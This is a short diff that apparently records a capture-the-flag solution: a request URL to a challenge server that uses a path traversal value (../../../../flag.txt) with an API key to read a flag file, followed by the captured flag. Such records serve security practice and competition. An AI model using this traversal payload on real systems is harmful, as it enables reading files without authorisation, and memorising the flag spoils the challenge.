@@ -1,0 +1,3 @@
+http://34.186.135.240:30000/attachment?file=../../../../flag.txt&apiKey=906392d25b3bd7d3af491799f89f6620
+
+Flag: bkctf{k3ys_in_th3_l0ck5}
